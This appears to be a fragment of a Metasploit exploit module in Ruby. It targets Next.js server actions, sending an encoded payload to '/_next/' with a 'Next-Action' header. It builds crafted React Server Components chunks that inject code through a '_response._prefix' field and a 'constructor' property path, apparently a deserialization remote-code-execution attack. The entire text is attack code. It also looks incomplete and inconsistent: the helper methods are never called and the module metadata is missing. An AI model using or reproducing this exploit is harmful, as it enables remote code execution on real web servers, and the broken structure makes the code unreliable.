class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  def exploit
    send_request_cgi('uri' => '/_next/', 'method' => 'POST', 'headers' => {'Next-Action' => 'x'}, 'data' => payload.encoded)
    execute_command(payload.encoded)
  end
  def build_chunk(code, ref, property)
    {
      'then' => "$#{ref}:then",
      'status' => 'pending',
      'value' => { 'then' => '$B' }.to_json,
      '_response' => {
        '_prefix' => code,
        '_formData' => { 'get' => "$#{ref}:#{property}" }
      }
    }.to_json
  end
  def property_path(method)
    "#{method}:constructor"
  end
end
